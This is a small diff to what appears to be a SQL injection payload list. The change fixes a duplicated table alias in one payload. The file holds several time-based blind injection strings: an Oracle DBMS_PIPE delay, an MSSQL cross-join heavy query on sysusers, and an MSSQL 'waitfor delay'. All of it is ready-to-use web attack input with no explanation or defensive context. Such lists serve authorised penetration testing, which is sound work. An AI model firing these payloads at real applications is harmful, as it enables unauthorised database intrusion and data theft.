@@ -16,7 +16,7 @@ payload
 
 `'||(SELECT 1 FROM DUAL WHERE 6994=6994 AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(110)||CHR(99)||CHR(76)||CHR(110),5))||'`
 
-`'%2b(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7,sysusers AS sys8,sysusers AS sys8)%2b'`
+`'%2b(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7,sysusers AS sys8,sysusers AS sys9)%2b'`
 
 ` waitfor delay '0:0:5' --`
 
